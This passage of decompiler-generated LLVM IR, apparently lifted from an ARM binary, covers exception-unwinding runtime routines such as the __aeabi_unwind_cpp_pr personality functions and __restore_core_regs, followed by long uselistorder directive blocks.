dec_label_pc_19064:                               ; preds = %dec_label_pc_19038.dec_label_pc_19064_crit_edge, %dec_label_pc_19104
  %v0_19064 = phi i32 [ %v0_19064.pre, %dec_label_pc_19038.dec_label_pc_19064_crit_edge ], [ %v1_19108, %dec_label_pc_19104 ]
  %v1_19064 = inttoptr i32 %v0_19064 to i32*
  %v2_19064 = load i32, i32* %v1_19064, align 4
  %v4_19064 = add i32 %v0_19064, 4
  store i32 %v4_19064, i32* @r7, align 4
  br label %dec_label_pc_19024

dec_label_pc_19070:                               ; preds = %dec_label_pc_18f78
  %v0_19080 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19080, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19088 = load i32, i32* @r8, align 4
  %v1_19088 = add i32 %v0_19088, 32
  %v2_19088 = inttoptr i32 %v1_19088 to i32*
  %v3_19088 = load i32, i32* %v2_19088, align 4
  store i32 %v3_19088, i32* @r4, align 4
  %v5_1908c = call i32 @_Unwind_VRS_Get(i32 %v0_19080, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1908c, i32* %r0.global-to-local, align 4
  %v3_19090 = load i32, i32* %stack_var_-48, align 4
  %v0_19094 = load i32, i32* @r4, align 4
  %v9_19094 = icmp eq i32 %v0_19094, %v3_19090
  br i1 %v9_19094, label %dec_label_pc_1909c, label %dec_label_pc_18ff0

dec_label_pc_1909c:                               ; preds = %dec_label_pc_19070
  %v0_1909c = load i32, i32* @r8, align 4
  %v1_1909c = add i32 %v0_1909c, 40
  %v2_1909c = inttoptr i32 %v1_1909c to i32*
  %v3_1909c = load i32, i32* %v2_1909c, align 4
  %v1_190a0 = load i32, i32* @r7, align 4
  %v9_190a0 = icmp eq i32 %v3_1909c, %v1_190a0
  br i1 %v9_190a0, label %dec_label_pc_190a8, label %dec_label_pc_18ff0

dec_label_pc_190a8:                               ; preds = %dec_label_pc_1909c
  %v1_190a8 = inttoptr i32 %v3_1909c to i32*
  %v2_190a8 = load i32, i32* %v1_190a8, align 4
  %v1_190ac = and i32 %v2_190a8, 1073741824
  %v2_190ac = icmp eq i32 %v1_190ac, 0
  br i1 %v2_190ac, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_190a8
  %v2_190b0 = or i32 %v2_190a8, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_190a8
  %tmp208 = bitcast i32 %v2_190a8 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_190b4 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_190b8 = phi i32 [ %v2_191e8, %.thread28 ], [ %v2_191e8, %bb169 ], [ %v3_1909c, %bb165 ], [ %v3_1909c, %.thread26 ]
  %v0_190b8 = phi i32 [ %v2_191f8, %.thread28 ], [ %v2_191f4, %bb169 ], [ %v2_190b0, %bb165 ], [ %v2_190b4, %.thread26 ]
  %v2_190b8 = add i32 %v0_190b8, %v1_190b8
  store i32 %v2_190b8, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_190d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_190d0, i32* %r0.global-to-local, align 4
  %v5_190d8 = call i32 @_Unwind_VRS_Set(i32 %v0_190d0, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_190d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_190f0 = load i32, i32* @r8, align 4
  store i32 %v0_190f0, i32* %stack_var_-48, align 4
  %v5_190f8 = call i32 @_Unwind_VRS_Set(i32 %v0_190d0, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18eac

dec_label_pc_19104:                               ; preds = %dec_label_pc_19038
  %v0_19104 = load i32, i32* @r8, align 4
  %v1_19104 = add i32 %v0_19104, 40
  %v2_19104 = inttoptr i32 %v1_19104 to i32*
  %v3_19104 = load i32, i32* %v2_19104, align 4
  %v1_19108 = load i32, i32* @r7, align 4
  %v9_19108 = icmp eq i32 %v3_19104, %v1_19108
  br i1 %v9_19108, label %dec_label_pc_19110, label %dec_label_pc_19064

dec_label_pc_19110:                               ; preds = %dec_label_pc_19104
  %v1_19114 = add i32 %v3_19104, 4
  store i32 %v1_19114, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_1911c = add i32 %v0_19104, 44
  %v3_1911c = inttoptr i32 %v2_1911c to i32*
  store i32 0, i32* %v3_1911c, align 4
  %v0_19120 = load i32, i32* %r2.global-to-local, align 4
  %v1_19120 = load i32, i32* @r8, align 4
  %v2_19120 = add i32 %v1_19120, 48
  %v3_19120 = inttoptr i32 %v2_19120 to i32*
  store i32 %v0_19120, i32* %v3_19120, align 4
  %v0_19124 = load i32, i32* @sl, align 4
  %v1_19124 = load i32, i32* @r8, align 4
  %v2_19124 = add i32 %v1_19124, 40
  %v3_19124 = inttoptr i32 %v2_19124 to i32*
  store i32 %v0_19124, i32* %v3_19124, align 4
  %v0_19128 = load i32, i32* %r0.global-to-local, align 4
  %v1_19128 = load i32, i32* @r8, align 4
  %v2_19128 = add i32 %v1_19128, 52
  %v3_19128 = inttoptr i32 %v2_19128 to i32*
  store i32 %v0_19128, i32* %v3_19128, align 4
  %v0_1912c = load i32, i32* @r7, align 4
  %v1_1912c = inttoptr i32 %v0_1912c to i32*
  %v2_1912c = load i32, i32* %v1_1912c, align 4
  %v1_19130 = icmp slt i32 %v2_1912c, 0
  br i1 %v1_19130, label %dec_label_pc_19138, label %dec_label_pc_191e4

dec_label_pc_19138:                               ; preds = %dec_label_pc_19110
  %v0_19138 = load i32, i32* %r2.global-to-local, align 4
  %v1_19138 = add i32 %v0_19138, -3
  store i32 %v1_19138, i32* %r2.global-to-local, align 4
  %v0_1913c = load i32, i32* %r0.global-to-local, align 4
  %v1_1913c = add i32 %v0_1913c, 4
  store i32 %v1_1913c, i32* @r6, align 4
  br label %dec_label_pc_1902c

dec_label_pc_19148:                               ; preds = %dec_label_pc_18f58, %dec_label_pc_18fe4, %dec_label_pc_18f10, %dec_label_pc_18ee4.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19158 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19158, i32* %r0.global-to-local, align 4
  %v5_19160 = call i32 @_Unwind_VRS_Get(i32 %v0_19158, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19164 = load i32, i32* @r7, align 4
  %v1_19164 = load i32, i32* @r8, align 4
  %v2_19164 = add i32 %v1_19164, 40
  %v3_19164 = inttoptr i32 %v2_19164 to i32*
  store i32 %v0_19164, i32* %v3_19164, align 4
  %v3_19168 = load i32, i32* %stack_var_-48, align 4
  %v3_1916c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1916c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19174 = load i32, i32* @r8, align 4
  %v2_19174 = add i32 %v1_19174, 32
  %v3_19174 = inttoptr i32 %v2_19174 to i32*
  store i32 %v3_19168, i32* %v3_19174, align 4
  %v0_19178 = load i32, i32* %r2.global-to-local, align 4
  %v1_19178 = load i32, i32* @r8, align 4
  %v2_19178 = add i32 %v1_19178, 36
  %v3_19178 = inttoptr i32 %v2_19178 to i32*
  store i32 %v0_19178, i32* %v3_19178, align 4
  %v1_18eb4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18eac

dec_label_pc_19180:                               ; preds = %bb155
  %v1_19180 = inttoptr i32 %v0_18e08 to i32*
  %v2_19180 = load i32, i32* %v1_19180, align 4
  %v1_19184 = add i32 %v0_18e08, 4
  %v1_19188 = and i32 %v2_19180, 1073741824
  %v2_19188 = icmp eq i32 %v1_19188, 0
  %v2_1918c = or i32 %v2_19180, -2147483648
  %tmp210 = bitcast i32 %v2_19180 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_19190 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_19188, i32 %v2_19190, i32 %v2_1918c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_19194 = load i32, i32* @r8, align 4
  %v2_19194 = add i32 %v1_19194, 56
  %v3_19194 = inttoptr i32 %v2_19194 to i32*
  store i32 %v1_19184, i32* %v3_19194, align 4
  %v0_19198 = load i32, i32* @r8, align 4
  store i32 %v0_19198, i32* %r0.global-to-local, align 4
  %v4_191a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 28) to i32*), align 4
  store i32 102832, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_191a4)
  %v0_191b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_191b0 = icmp eq i32 %v0_191b0, 0
  br i1 %v2_191b0, label %dec_label_pc_18ea8, label %dec_label_pc_191b8

dec_label_pc_191b8:                               ; preds = %dec_label_pc_19180
  %v0_191b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_191b8 = load i32, i32* @r7, align 4
  %v2_191b8 = add i32 %v1_191b8, %v0_191b8
  store i32 %v2_191b8, i32* %stack_var_-48, align 4
  %v0_191c8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_191c8, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_191d8 = call i32 @_Unwind_VRS_Set(i32 %v0_191c8, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18eac

dec_label_pc_191e4:                               ; preds = %dec_label_pc_19110
  %v0_191e4 = load i32, i32* @sl, align 4
  %v3_191e4 = mul i32 %v0_191e4, 4
  %v0_191e8 = load i32, i32* %r0.global-to-local, align 4
  %v2_191e8 = add i32 %v0_191e8, %v3_191e4
  %v3_191e8 = inttoptr i32 %v2_191e8 to i32*
  %v4_191e8 = load i32, i32* %v3_191e8, align 4
  %v1_191ec = and i32 %v4_191e8, 1073741824
  %v2_191ec = icmp eq i32 %v1_191ec, 0
  br i1 %v2_191ec, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_191e4
  %v2_191f4 = or i32 %v4_191e8, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_191e4
  %tmp212 = bitcast i32 %v4_191e8 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_191f8 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_191e8, { 2, 1, 0 }
  uselistorder i32 %v1_1913c, { 1, 0 }
  uselistorder i32 %v1_19138, { 1, 0 }
  uselistorder i32 %v1_19108, { 1, 0 }
  uselistorder i32 %v0_190d0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1909c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19064, { 1, 0 }
  uselistorder i32 %v0_19064, { 1, 0 }
  uselistorder i32 %v2_18d5866, { 1, 0 }
  uselistorder i32 %v2_19030, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18d58, { 1, 0 }
  uselistorder i32 %v1_18ff0, { 1, 0 }
  uselistorder i32 %v3_18f8c, { 2, 0, 1 }
  uselistorder i32 %v0_18f6c, { 1, 0 }
  uselistorder i32 %v0_18f6c.pre, { 1, 0 }
  uselistorder i32 %v1_18ec4, { 1, 0 }
  uselistorder i32 %v2_18ebc, { 1, 0 }
  uselistorder i32 %v0_18e4c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_18e0c, { 1, 0 }
  uselistorder i32 %v1_18e08, { 1, 0 }
  uselistorder i32 %v0_18e08, { 1, 0, 2 }
  uselistorder i32 %v4_18de0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18f84, { 1, 2, 0 }
  uselistorder i32 %v0_18db8, { 1, 0 }
  uselistorder i32 %v3_18db4, { 1, 0, 2 }
  uselistorder i32 %v1_18d88, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18fc0, { 1, 0 }
  uselistorder i1 %v2_18df4, { 1, 0, 2 }
  uselistorder i32 %v1_18cf8, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 77, 0, 15, 16, 76, 4, 32, 33, 18, 28, 19, 29, 20, 30, 17, 31, 2, 34, 21, 35, 1, 5, 36, 37, 38, 6, 39, 40, 41, 42, 7, 43, 44, 45, 46, 8, 47, 9, 48, 49, 22, 50, 10, 51, 52, 53, 23, 54, 11, 55, 56, 57, 24, 58, 59, 60, 25, 61, 12, 62, 63, 64, 65, 26, 66, 13, 67, 68, 69, 70, 71, 72, 27, 73, 14, 74, 3, 75 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 23, 1, 2, 5, 12, 13, 9, 10, 11, 14, 16, 15, 6, 18, 19, 3, 20, 0, 21, 22, 7, 8, 17, 4 }
  uselistorder i32 48, { 17, 2, 0, 6, 4, 5, 9, 10, 7, 8, 14, 15, 16, 11, 12, 3, 13, 1 }
  uselistorder i32 44, { 40, 2, 41, 42, 0, 13, 3, 14, 4, 5, 6, 24, 25, 26, 27, 28, 29, 21, 22, 23, 7, 19, 20, 8, 1, 9, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 10, 11, 12, 15, 16, 17, 18 }
  uselistorder i32 -2147483648, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 1073741824, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 2 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 149, 28, 29, 30, 31, 32, 33, 34, 148, 35, 36, 37, 38, 40, 39, 42, 41, 43, 44, 2, 45, 0, 3, 46, 47, 49, 48, 1, 52, 50, 51, 53, 58, 54, 59, 55, 60, 56, 57, 61, 62, 63, 64, 66, 67, 65, 147, 69, 68, 72, 73, 74, 70, 71, 77, 75, 78, 76, 79, 80, 81, 82, 83, 85, 86, 84, 87, 89, 88, 92, 93, 94, 90, 91, 95, 96, 98, 99, 100, 97, 101, 102, 104, 103, 106, 105, 107, 108, 110, 109, 112, 111, 114, 115, 113, 116, 117, 124, 118, 125, 119, 126, 120, 127, 121, 128, 122, 123, 130, 129, 131, 132, 133, 134, 139, 135, 140, 136, 141, 137, 138, 143, 142, 144, 145, 146 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_2223c.361 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 27, 68, 86, 69, 87, 15, 16, 70, 71, 72, 88, 17, 89, 90, 91, 18, 92, 19, 73, 93, 94, 20, 21, 22, 95, 74, 96, 23, 97, 24, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 25, 104, 105, 106, 34, 33, 35, 107, 108, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 109, 5, 110, 111, 112, 113, 32, 76, 114, 81 }
  uselistorder i32 -2, { 0, 30, 31, 6, 3, 4, 2, 7, 8, 9, 1, 5, 10, 26, 25, 27, 28, 29, 18, 19, 20, 21, 22, 23, 24, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19148, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19064, { 1, 0 }
  uselistorder label %dec_label_pc_1902c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18ff0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_18f6c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_18eac, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18ea8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_18e08, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18d64, { 1, 0 }
  uselistorder label %dec_label_pc_18d64.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18d64.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_19204(i32 %arg1) local_unnamed_addr {
dec_label_pc_19204:
  %v0_19204 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19204, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19204
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19204, %bb
  %v10_1920c = phi i32 [ %arg1, %dec_label_pc_19204 ], [ 0, %bb ]
  ret i32 %v10_1920c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 26, 27, 28, 45, 22, 25, 46, 47, 48, 49, 50, 5, 4, 51, 41, 42, 29, 30, 23, 33, 32, 31, 34, 6, 8, 7, 20, 44, 43, 24, 19, 37, 12, 38, 21, 11, 10, 9, 13, 14, 15, 35, 16, 17, 18, 40, 36, 39, 52, 53 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 38, 14, 15, 16, 34, 35, 36, 37, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19214 = load i32, i32* @r1, align 4
  %v2_19214 = load i32, i32* @r2, align 4
  %v4_19214 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_19214, i32 %v2_19214, i32 2)
  ret i32 %v4_19214
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_1921c = load i32, i32* @r1, align 4
  %v2_1921c = load i32, i32* @r2, align 4
  %v4_1921c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_1921c, i32 %v2_1921c, i32 1)
  ret i32 %v4_1921c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19224 = load i32, i32* @r1, align 4
  %v2_19224 = load i32, i32* @r2, align 4
  %v4_19224 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_19224, i32 %v2_19224, i32 0)
  ret i32 %v4_19224

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 10, 11, 12, 61, 13, 0, 22, 14, 23, 62, 63, 64, 18, 19, 20, 21, 43, 44, 45, 46, 65, 66, 67, 81, 82, 83, 84, 1, 70, 71, 2, 72, 73, 3, 74, 68, 69, 37, 38, 4, 5, 6, 59, 60, 7, 8, 47, 48, 49, 75, 76, 77, 78, 79, 80, 39, 40, 41, 50, 51, 52, 54, 26, 15, 16, 17, 29, 30, 27, 28, 24, 25, 31, 32, 33, 34, 35, 36, 42, 9, 53, 55, 56, 57, 58 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1922c = add i32 %tmp, 56
  %v4_1922c = inttoptr i32 %v3_1922c to i32*
  %v5_1922c = load i32, i32* %v4_1922c, align 4
  %v6_1922c = add i32 %tmp, 60
  %v7_1922c = inttoptr i32 %v6_1922c to i32*
  %v8_1922c = load i32, i32* %v7_1922c, align 4
  %v2_19238 = load i32, i32* %arg1, align 4
  %v3_19238 = add i32 %tmp, 4
  %v4_19238 = inttoptr i32 %v3_19238 to i32*
  %v5_19238 = load i32, i32* %v4_19238, align 4
  store i32 %v5_19238, i32* @r1, align 4
  %v12_19238 = add i32 %tmp, 16
  %v13_19238 = inttoptr i32 %v12_19238 to i32*
  %v14_19238 = load i32, i32* %v13_19238, align 4
  store i32 %v14_19238, i32* @r4, align 4
  %v15_19238 = add i32 %tmp, 20
  %v16_19238 = inttoptr i32 %v15_19238 to i32*
  %v17_19238 = load i32, i32* %v16_19238, align 4
  store i32 %v17_19238, i32* @r5, align 4
  %v18_19238 = add i32 %tmp, 24
  %v19_19238 = inttoptr i32 %v18_19238 to i32*
  %v20_19238 = load i32, i32* %v19_19238, align 4
  store i32 %v20_19238, i32* @r6, align 4
  %v21_19238 = add i32 %tmp, 28
  %v22_19238 = inttoptr i32 %v21_19238 to i32*
  %v23_19238 = load i32, i32* %v22_19238, align 4
  store i32 %v23_19238, i32* @r7, align 4
  %v24_19238 = add i32 %tmp, 32
  %v25_19238 = inttoptr i32 %v24_19238 to i32*
  %v26_19238 = load i32, i32* %v25_19238, align 4
  store i32 %v26_19238, i32* @r8, align 4
  %v27_19238 = add i32 %tmp, 36
  %v28_19238 = inttoptr i32 %v27_19238 to i32*
  %v29_19238 = load i32, i32* %v28_19238, align 4
  store i32 %v29_19238, i32* @sb, align 4
  %v30_19238 = add i32 %tmp, 40
  %v31_19238 = inttoptr i32 %v30_19238 to i32*
  %v32_19238 = load i32, i32* %v31_19238, align 4
  store i32 %v32_19238, i32* @sl, align 4
  store i32 %v8_1922c, i32* @ip, align 4
  store i32 %v5_1922c, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_1922c)
  ret i32 %v2_19238

; uselistorder directives
  uselistorder i32 %v8_1922c, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 46, 47, 48, 49, 16, 17, 5, 0, 52, 6, 7, 50, 51, 14, 15, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 1, 86, 87, 88, 89, 90, 91, 92, 93, 94, 8, 95, 96, 38, 39, 2, 40, 41, 42, 43, 44, 45, 9, 10, 36, 11, 37, 12, 23, 13, 18, 19, 30, 31, 32, 33, 34, 35, 24, 25, 26, 27, 28, 29, 3, 20, 21, 22, 4 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 15, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26 }
  uselistorder i32* @sb, { 116, 117, 118, 6, 7, 8, 9, 98, 99, 100, 101, 102, 103, 104, 105, 106, 109, 107, 108, 110, 90, 91, 73, 74, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 29, 30, 25, 26, 27, 28, 10, 11, 12, 13, 14, 15, 16, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 92, 93, 94, 95, 96, 97, 111, 112, 113, 114, 115 }
  uselistorder i32 36, { 19, 18, 4, 20, 6, 7, 5, 15, 17, 8, 16, 9, 0, 1, 2, 3, 10, 11, 12, 13, 14 }
  uselistorder i32* @r8, { 284, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 2, 283, 0, 47, 285, 13, 286, 48, 49, 50, 51, 34, 35, 36, 37, 38, 39, 40, 41, 42, 4, 43, 44, 45, 46, 52, 53, 54, 55, 14, 287, 15, 16, 17, 31, 32, 5, 33, 219, 220, 6, 221, 222, 223, 247, 248, 249, 250, 251, 11, 252, 253, 254, 255, 256, 257, 258, 259, 206, 207, 208, 209, 191, 192, 193, 194, 195, 18, 170, 171, 172, 173, 61, 62, 63, 64, 107, 108, 109, 110, 111, 65, 66, 67, 68, 112, 113, 114, 115, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 19, 30, 81, 82, 83, 84, 7, 56, 1, 57, 58, 59, 12, 60, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 100, 97, 98, 99, 103, 101, 102, 10, 104, 105, 106, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 8, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 196, 197, 198, 199, 200, 201, 9, 202, 203, 204, 205, 210, 211, 3, 212, 213, 214, 215, 216, 217, 218, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 260, 261, 262, 263, 264, 265 }
  uselistorder i32 32, { 99, 96, 97, 98, 52, 100, 101, 48, 63, 102, 47, 93, 53, 49, 78, 76, 77, 73, 74, 75, 85, 86, 79, 80, 65, 66, 67, 83, 84, 54, 91, 92, 94, 2, 3, 5, 4, 95, 7, 6, 9, 8, 11, 10, 12, 50, 55, 51, 87, 56, 68, 14, 13, 60, 69, 57, 70, 58, 71, 59, 72, 16, 15, 18, 17, 20, 19, 64, 22, 21, 24, 23, 25, 27, 26, 29, 28, 30, 31, 33, 32, 81, 82, 88, 34, 89, 35, 90, 36, 37, 38, 39, 61, 40, 41, 42, 62, 43, 0, 44, 1, 45, 46 }
  uselistorder i32 28, { 45, 10, 28, 46, 25, 47, 48, 49, 50, 7, 29, 30, 26, 27, 34, 11, 31, 12, 42, 43, 44, 8, 13, 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 9, 17, 33, 32, 14, 15, 16, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 24, { 96, 95, 97, 8, 9, 98, 0, 58, 59, 60, 61, 62, 63, 56, 57, 10, 64, 65, 75, 76, 66, 67, 7, 11, 94, 89, 90, 91, 1, 77, 78, 79, 38, 39, 12, 68, 69, 70, 49, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 52, 53, 54, 55, 71, 72, 73, 74, 13, 14, 15, 16, 17, 18, 19, 20, 21, 80, 22, 23, 2, 24, 25, 26, 3, 27, 28, 4, 29, 30, 81, 31, 5, 82, 32, 83, 84, 85, 86, 33, 34, 6, 87, 35, 88, 36, 92, 37, 93 }
  uselistorder i32 20, { 127, 125, 126, 128, 1, 4, 9, 35, 129, 31, 130, 131, 132, 133, 5, 134, 135, 2, 136, 36, 10, 32, 33, 34, 37, 38, 39, 49, 50, 40, 41, 137, 118, 119, 120, 121, 122, 123, 124, 11, 114, 115, 116, 3, 51, 12, 52, 53, 0, 30, 43, 6, 45, 13, 46, 29, 44, 42, 47, 48, 14, 15, 16, 17, 54, 18, 55, 56, 57, 58, 59, 60, 19, 61, 62, 63, 64, 65, 66, 20, 67, 68, 69, 70, 71, 72, 73, 74, 75, 21, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 23, 90, 91, 24, 92, 93, 94, 95, 25, 96, 97, 26, 98, 99, 100, 101, 102, 103, 104, 7, 105, 27, 106, 107, 108, 109, 8, 110, 28, 111, 112, 113, 117 }
